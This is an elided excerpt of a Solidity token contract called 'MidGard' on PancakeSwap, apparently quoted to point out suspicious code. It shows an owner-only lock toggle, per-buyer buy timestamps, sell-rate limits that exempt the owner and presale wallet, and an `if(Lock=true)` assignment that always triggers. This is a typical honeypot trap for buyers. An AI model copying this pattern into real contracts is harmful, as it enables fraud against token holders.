...
contract MidGard is Context, IERC20, Ownable {
    ...
    mapping (address => uint) public walletToBuyTime;
    ...
    uint256 public _maxBuyAmount = 100000000 * 10**_decimals;
    uint256 public _maxSellAmount = 100000000 * 10**_decimals;
    uint256 public numTokensToSwap = 10000 * 10**_decimals;
    
	uint public sellPerSecond = 120;    					                     
...
//    IUniswapV2Router02 _PancakeSwapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); //BSC mainnet
    ...
    function setLock(bool _enable) public onlyOwner {
        Lock = _enable;
    }
    ...
    function setAddress(address payable marketing) public onlyOwner {
                ...
                if(sender == pancakeswapV2Pair) {
                    ...
                    if(sender != owner() && recipient != owner() && recipient != wallet_presale && sender != wallet_presale && recipient != address(1)){	
                        if(Lock=true) {
                            ...
                            walletToBuyTime[recipient] = block.timestamp;
                        }
                    }
